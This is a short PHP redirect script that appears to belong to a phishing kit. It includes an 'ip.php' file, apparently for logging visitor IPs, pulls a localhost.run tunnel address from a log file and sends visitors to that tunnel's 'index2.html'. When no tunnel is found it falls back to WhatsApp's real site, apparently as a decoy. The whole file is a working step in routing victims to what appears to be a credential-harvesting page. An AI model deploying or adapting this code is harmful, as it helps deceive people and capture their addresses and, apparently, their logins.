<?php
include 'ip.php';

$log = file_get_contents('.lhr.log');
preg_match('/https:\/\/[a-z0-9]*\.lhr\.life/', $log, $matches);

if (isset($matches[0])) {
    header('Location: ' . $matches[0] . '/index2.html');
} else {
    header('Location: https://www.whatsapp.com');
}
exit();
?>
